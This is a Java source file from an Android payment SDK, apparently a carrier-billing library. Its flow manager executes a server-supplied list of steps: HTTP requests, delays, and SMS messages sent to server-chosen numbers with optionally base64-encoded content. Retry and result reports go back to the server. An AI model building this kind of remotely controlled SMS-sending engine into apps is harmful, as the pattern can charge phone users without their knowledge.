package com.bbpay.android.manager;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;
import org.json.JSONObject;
import android.content.Context;
import android.os.Handler;
import android.text.TextUtils;
import com.bbpay.android.listener.FlowListener;
import com.bbpay.android.listener.RequestCallback;
import com.bbpay.android.listener.SendSmsListener;
import com.bbpay.android.setting.Setting;
import com.bbpay.android.sms.SmsSender;
import com.bbpay.android.utils.CommonUtil;
import com.bbpay.android.utils.InfoUtils;
import com.bbpay.android.utils.MyLogger;
import com.bbpay.android.utils.RequestUtils;
import com.bbpay.android.utils.StringUtils;
import com.bbpay.android.utils.base64.Base64;
import com.bbpay.common.bean.BizInstance;
import com.bbpay.common.bean.HttpResponse;
import com.bbpay.common.bean.Json;
import com.bbpay.common.bean.KeyValue;
import com.bbpay.common.bean.Matcher;
import com.bbpay.common.bean.request.ScriptForm;
import com.bbpay.common.bean.request.StepReportForm;
import com.bbpay.common.bean.response.ScriptResponse;
import com.bbpay.common.bean.step.AbstractStep;
import com.bbpay.common.bean.step.DelayStep;
import com.bbpay.common.bean.step.RequestStep;
import com.bbpay.common.bean.step.ScriptRequestStep;
import com.bbpay.common.bean.step.SmsStep;

public class FlowManager {
    private class StepProxy {
        AbstractStep step;
        StringBuilder errorLog = new StringBuilder();
        StringBuilder successLog = new StringBuilder();
        int errorTryCount;
        int errorTrySequence = 1;
        int successTryCount;
        int successTrySequence = 1;
        StepProxy(AbstractStep step) {
            this.step = step;
            errorTryCount = step.errorTryCount;
            successTryCount = step.reExecuteCount;
        }
        private String getLog() {
            JSONObject obj = new JSONObject();
            try {
                if (successLog.length() > 0) obj.put("successLog", successLog.toString());
                if (errorLog.length() > 0) obj.put("errorLog", errorLog.toString());
            } catch (Exception e) {
                MyLogger.error(e);
            }
            return obj.toString();
        }
        private boolean matchCondition(String conditionName, String regex) {
            if (TextUtils.isEmpty(conditionName) || TextUtils.isEmpty(regex)) return true;
            boolean result = false;
            String runTimeValue = variables.get(conditionName);
            if (runTimeValue != null) {
                try {
                    result = Pattern.compile(regex).matcher(runTimeValue).matches();
                } catch (Exception e) {
                    MyLogger.error(e);
                }
            }
            return result;
        }
        void onFailure(String errorMsg) {
            if (errorLog.length() > 0) errorLog.append(",");
            errorLog.append(errorTrySequence).append(STRING5).append(errorMsg);
            if (errorTrySequence < errorTryCount && matchCondition(step.errorTryConditionVariableName, step.errorTryConditionRegex)) {
                errorTrySequence++;
                if (step.errorTryInterval > 0) {
                    CommonUtil.sleep(step.errorTryInterval * 1000);
                    errorLog.append(SLEEP).append(step.errorTryInterval).append(SECONDS);
                }
                execute(this);
            } else {
                stepFailure(step, getLog());
            }
        }
        void onSuccess() {
            if (successLog.length() > 0) successLog.append(",");
            successLog.append(successTrySequence);
            if (successTrySequence < successTryCount && matchCondition(step.reExecuteConditionVariableName, step.reExecuteConditionRegex)) {
                successTrySequence++;
                if (step.reExecuteInterval > 0) {
                    CommonUtil.sleep(step.reExecuteInterval * 1000);
                    successLog.append(SLEEP).append(step.reExecuteInterval).append(SECONDS);
                }
                execute(this);
            } else {
                stepSuccess(step, getLog());
            }
        }
    }
    private static boolean validate(String regex, String value) {
        try {
            return regex == null || regex.length() == 0 || value != null && java.util.regex.Pattern.compile(regex).matcher(value).find();
        } catch (Throwable e) {
            MyLogger.error(e);
        }
        return false;
    }
    private Map<String, String> variables = new HashMap<String, String>();
    private FlowListener listener;
    private static final String STRING5 = ":";
    private static final String SECONDS = " seconds";
    private static final String SLEEP = ",sleep ";
    private Context context;
    private static final String STRING = ")";
    private static final String VALUE = ",value:";
    private static final String PARSE_RESPONSE_ERROR_NAME = "parseResponseError:(name:";
    private static final String RECEIVER_OR_MSG_EMPTY = "receiverOrMsgEmpty";
    private int stepIndex = 0;
    private List<AbstractStep> stepList;
    private Handler handler;
    private BizInstance bizInstance;
    public FlowManager(Context context) {
        this.context = context;
        handler = new Handler(context.getMainLooper());
    }
    public void cancelFlow() {
        listener.onFinished(com.export.Pay.PAY_CANCEL, "cancel");
    }
    private void doDelay(StepProxy holder) {
        CommonUtil.sleep(((DelayStep) holder.step).delayTime * 1000);
        stepIndex++;
        execute();
    }
    private void doScriptRequest(final StepProxy holder) {
        final ScriptRequestStep step = (ScriptRequestStep) holder.step;
        List<KeyValue> params = new ArrayList<KeyValue>();
        if (step.params != null) {
            for (KeyValue kv : step.params) {
                params.add(new KeyValue(kv.key, CommonUtil.getRuntimeValue(variables, kv.value)));
            }
        }
        try {
            ScriptForm form = InfoUtils.initForm(context, ScriptForm.class);
            form.params = params;
            form.bizInstanceId = bizInstance.id;
            final String url = Setting.getServerUrl();
            RequestUtils.encryptPost(context, url, form.toJson(), new RequestCallback() {
                @Override
                public void onResult(String content, Throwable error) {
                    if (StringUtils.isBlank(content)) {
                        holder.onFailure(error.getMessage());
                        return;
                    }
                    try {
                        ScriptResponse response = Json.optObj(ScriptResponse.class, new JSONObject(content));
                        InfoUtils.handleInfo(context, response);
                        if (parseResponse(step.response, response.result)) {
                            holder.onSuccess();
                        } else {
                            holder.onFailure(error.getMessage());
                        }
                    } catch (Throwable e) {
                        holder.onFailure(e.getMessage());
                    }
                }
            });
        } catch (Throwable e) {
            MyLogger.error(e);
        }
    }
    private void doRequest(final StepProxy holder) {
        final RequestStep step = (RequestStep) holder.step;
        final String url = CommonUtil.getRuntimeValue(variables, step.url);
        MyLogger.debug(url);
        RequestCallback callback = new RequestCallback() {
            @Override
            public void onResult(String content, Throwable error) {
                if (error != null) {
                    MyLogger.error(error);
                    holder.onFailure(error.getMessage());
                    return;
                }
                if (parseResponse(step.response, content)) {
                    holder.onSuccess();
                } else {
                    holder.onFailure("parse-body-error");
                }
            }
        };
        if ("post".equalsIgnoreCase(step.method)) {
            //RequestUtils.post(context, url, variables, callback, 3);
        } else {
            RequestUtils.get(context, url, callback, 3);
        }
    }
    private void doSendSms(final StepProxy holder) {
        final SmsStep step = (SmsStep) holder.step;
        step.realReceiver = CommonUtil.getRuntimeValue(variables, step.receiver);
        step.realMsg = CommonUtil.getRuntimeValue(variables, step.msg);
        if (step.base64Decode) {
            step.realMsg = Base64.decode(step.realMsg);
        }
        if (TextUtils.isEmpty(step.realReceiver) || TextUtils.isEmpty(step.realMsg)) {
            holder.onFailure(RECEIVER_OR_MSG_EMPTY);
            return;
        }
        SendSmsListener listener = new SendSmsListener() {
            @Override
            public void onFailed(String address, String message, String errorMsg) {
                holder.onFailure(errorMsg);
            }
            @Override
            public void onSuccess(String address, String message) {
                holder.onSuccess();
            }
        };
        SmsSender.sendSms(context, listener, step.realReceiver, step.realMsg, step.timeout);
    }
    private void execute() {
        if (stepIndex < stepList.size()) {
            AbstractStep step = stepList.get(stepIndex);
            step.executeStartTime = System.currentTimeMillis();
            execute(new StepProxy(step));
        } else {
            flowSuccess();
        }
    }
    private void execute(StepProxy holder) {
        switch (holder.step.actionId) {
            case AbstractStep.REQUEST:
                doRequest(holder);
                break;
            case AbstractStep.SCRIPT_REQUEST:
                doScriptRequest(holder);
                break;
            case AbstractStep.DELAY:
                doDelay(holder);
                break;
            case AbstractStep.SMS:
                doSendSms(holder);
                break;
        }
    }
    private void flowFailure(int stepIndex, String message) {
        listener.onFinished(com.export.Pay.PAY_FAILURE, stepIndex + "," + message);
    }
    private void flowSuccess() {
        listener.onFinished(com.export.Pay.PAY_SUCCESS, null);
    }
    private boolean parseResponse(HttpResponse response, String content) {
        if (response != null) {
            response.body = content;
            String parseError = parseResponseParam(response);
            if (parseError != null) { return false; }
        }
        return true;
    }
    private String parseResponseParam(HttpResponse response) {
        MyLogger.debug(response.body);
        if (response.matchers != null) {
            for (Matcher matcher : response.matchers) {
                matcher.value = CommonUtil.parseVariable(response.body, matcher.match);
                if (matcher.value != null) {
                    variables.put(matcher.variableName, matcher.value);
                }
                if (!validate(matcher.regexValidate, matcher.value)) { //
                    return PARSE_RESPONSE_ERROR_NAME + matcher.variableName + VALUE + matcher.value + STRING;
                }
            }
        }
        return null;
    }
    private void report(final AbstractStep step, final boolean success, final String message) {
        new Thread() {
            @Override
            public void run() {
                try {
                    StepReportForm reportForm = InfoUtils.initForm(context, StepReportForm.class);
                    reportForm.step = step;
                    reportForm.success = success;
                    reportForm.message = message;
                    RequestUtils.encryptPost(context, Setting.getServerUrl(), reportForm.toJson());
                } catch (Exception e) {
                    MyLogger.error(e);
                }
            }
        }.start();
    }
    public void startFlow(BizInstance bizInstance, int timeoutSeconds, final FlowListener listener) {
        this.bizInstance = bizInstance;
        stepList = bizInstance.stepList;
        this.listener = new FlowListener() {
            private boolean invoked;
            @Override
            public void onFinished(int result, String errorMsg) {
                if (!invoked) {
                    invoked = true;
                    listener.onFinished(result, errorMsg);
                }
            }
        };
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                timeout();
            }
        }, timeoutSeconds * 1000);
        handler.post(new Runnable() {
            @Override
            public void run() {
                execute();
            }
        });
    }
    private void stepFailure(final AbstractStep step, String errorMsg) {
        step.executeEndTime = System.currentTimeMillis();
        if (step.reportFailure) {
            report(step, false, errorMsg);
        }
        flowFailure(stepIndex, errorMsg);
    }
    private void stepSuccess(final AbstractStep step, String previousStepErrors) {
        step.executeEndTime = System.currentTimeMillis();
        if (step.reportSuccess) {
            report(step, true, previousStepErrors);
        }
        stepIndex++;
        execute();
    }
    private void timeout() {
        listener.onFinished(com.export.Pay.PAY_FAILURE, stepIndex + ",timeout");
    }
}
